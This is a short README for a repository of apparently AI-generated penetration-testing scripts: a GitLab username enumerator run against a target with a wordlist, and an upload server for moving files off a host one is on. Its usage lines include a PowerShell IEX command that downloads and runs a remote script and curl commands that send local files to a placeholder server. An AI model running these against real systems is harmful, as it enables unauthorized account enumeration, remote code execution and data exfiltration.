# Ai-Generated-Scripts
## GitLabUserEnum
### required Python packages
```
pip3 install requests tqdm
```
### Usage example
```
python3 GitLabUserEnum.py --url 'http://gitlab..local' --wordlist top-usernames-shortlist.txt -v -t 10
```
<img src="https://github.com/user-attachments/assets/457e58d0-5984-4dcc-be97-7bc1d35fb70f" width="300">

## SimpleUploadServer
This script can help you when the host you are on doesn't have uploadserver installed and can't install it.
**Usage**
Windows
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<ip>:8699 -File <full file path>
```
Linux
```
curl -F "file=@/path/to/local/file" http://<server-ip>:8699/
```
